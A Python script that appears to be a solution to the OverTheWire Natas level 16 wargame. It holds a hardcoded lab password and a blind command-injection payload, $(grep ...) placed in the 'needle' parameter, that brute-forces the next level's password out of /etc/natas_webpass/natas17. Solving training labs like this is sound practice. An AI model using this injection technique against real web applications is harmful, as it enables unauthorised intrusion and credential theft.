import natas, requests

URL = 'http://natas16.natas.labs.overthewire.org/'
USER = 'natas16'
PASS = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'
auth_basic = requests.auth.HTTPBasicAuth(USER, PASS)
header = {"Content-Type": "application/x-www-form-urlencoded"}
proxy = {"http":"http://127.0.0.1:8080"}

alfabeto = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'

passwd = ''
counter = 0
for req in range(31):
    for c in alfabeto:
        payload = f"{URL}?needle=African%24%28grep+^{passwd+c}+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search"
        for i in c:
            get = requests.get(url=payload, auth=auth_basic, proxies=proxy)
            counter = counter+1
            response_http = get.text
            if "African" not in response_http:
                passwd += c
                print(f'A senha é "{passwd}"')
                break
            flag = passwd